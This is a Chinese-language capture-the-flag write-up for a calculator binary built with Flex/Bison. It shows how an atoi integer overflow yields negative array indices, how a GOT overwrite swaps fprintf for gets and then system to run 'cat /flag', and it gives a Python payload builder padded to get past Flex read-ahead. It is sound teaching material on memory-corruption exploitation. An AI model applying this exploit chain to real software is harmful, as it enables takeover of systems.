# It's MyCalculator!!!!!

## 题目简述

附件是 Flex/Bison 实现的整数计算器，支持四则运算以及 `GET index`、`PUT index value`。历史结果存放在 `.bss` 中的 `int result_buffer[1024]`；服务端接收 Base64 文本，解码后把完整字节串一次性送入计算器 stdin。flag 位于 `/flag`。

词法器虽然只接受 `[0-9]+`，却用 `atoi` 转成 32 位有符号 `int`；超大十进制数会溢出为负数。语法动作只检查 `index >= 1024`，没有检查下界，因而 `result_buffer[index]` 可访问数组之前的任意 4 字节对齐地址。利用目标是覆盖可写 GOT，将错误处理中的 `fprintf` 依次替换为 `gets` 和 `system`，最终执行 `cat /flag`。决定性主障碍是越界任意读写与控制流劫持，归为 `pwn`。

## 解题过程

### 从词法溢出得到负索引

漏洞组合来自两处：

```c
/* cal.l */
[0-9]+  { yylval = atoi(yytext); return NUMBER; }

/* cal.y */
| GET NUMBER {
    if ($2 >= MAX_RESULT_BUFFER) yyerror("index out of range");
    else $$ = result_buffer[$2];
}
| PUT NUMBER exp {
    if ($2 >= MAX_RESULT_BUFFER) yyerror("index out of range");
    else result_buffer[$2] = $3;
}
```

把负索引 $i$ 按无符号 32 位十进制发送，即可绕过词法规则。对任意 4 字节对齐目标地址 `addr`：

```python
def calc_offset(addr, result_buffer):
    return ((addr - result_buffer) // 4) & 0xffffffff
```

程序为 Partial RELRO，GOT 仍可写；`result_buffer` 位于 ELF 的 `.bss`，到 GOT 的偏移固定。虽然 x86-64 GOT 槽为 8 字节，本题使用的 libc 函数位于相同映射高位，改写低 32 位即可把一个函数入口换成另一个。表达式

```text
PUT offset (target-original+GET offset)
```

先读原 GOT 低字，再加符号地址差，避免硬编码运行时 libc 基址。

### 利用 `yyerror` 的调用约定

错误处理固定调用：

```c
void yyerror(const char *s) {
    fprintf(stderr, "error: %s\n", s);
}
```

第一阶段把 `fprintf@GOT` 改成 `gets`，再输入越界的 `GET 2048` 触发 `yyerror`。调用现场原本传给 `fprintf` 的第一个参数是 `stderr`，换成 `gets` 后等价于 `gets((char *)stderr)`，于是下一行 `cat /flag` 被写进 `stderr` 对象起始处。

第二阶段把同一 GOT 槽从 `gets` 改成 `system`，再次用 `GET 2048` 触发错误。此时第一个参数仍是 `stderr`，其起始字节已经是以 NUL 结尾的 `cat /flag`，于是变成 `system("cat /flag")`。

### 处理 Flex 的非交互预读

手工终端输入时 Flex 的 interactive 分支用 `getc` 逐行读取；服务端通过 `subprocess.run(..., input=...)` 提供管道 stdin，scanner 走非交互分支：

```c
while ((result = fread(buf, 1, max_size, yyin)) == 0 && ferror(yyin)) {
    /* ... */
}
```

本题的 `num_to_read` 为 8192。如果直接把 `cat /flag` 紧跟在第一次触发之后，它会先被 Flex 读入自己的缓冲区，后续 `gets` 无法从底层 stdin 取得它。解决方法是把第一次触发之前的计算器文本精确补到 8192 字节，使 scanner 首次 `fread` 正好耗尽这一块；命令字符串留在后续字节中供 `gets` 读取：

```python
content = ""
content += "1+1\n"
content += "a\n"  # 产生一次语法错误，使解析器恢复到下一行
content += f"PUT {off} ({gets-fprintf}+GET {off})\n"
content += "GET 2048\n"
content = content.ljust(8192, " ")
content += "cat /flag\n"
content += f"PUT {off} ({system-gets}+GET {off})\n"
content += "GET 2048\n"
```

其中 `off`、`gets-fprintf` 和 `system-gets` 都应从附件 ELF 与配套 libc 符号计算。最终对 `content.encode()` 做 Base64 编码，按服务端约定提交并以单独的 `EOF` 结束。官方 `generate.py` 与 Flex/Bison 生成代码印证了完整链条；本轮未启动配套 Debian/glibc 环境动态利用，因此地址与函数差值必须以实际附件为准。

## 方法总结

- 核心技巧：用 `atoi` 有符号溢出制造负数组下标，借 `.bss` 相对 GOT 的固定偏移获得任意 4 字节读写，再复用错误调用现场完成 GOT 劫持。
- 识别信号：词法正则只限制字符而不限制数值范围、数组索引只查上界、Partial RELRO 与可触发的导入函数调用同时出现时，应立即检查负索引到 GOT 的距离。
- 复用要点：exploit 不仅要满足内存原语，还要理解输入层缓冲；Flex 在 TTY 与管道下选择不同的 `YY_INPUT` 分支，预读长度会决定第二阶段数据能否被劫持后的输入函数取得。
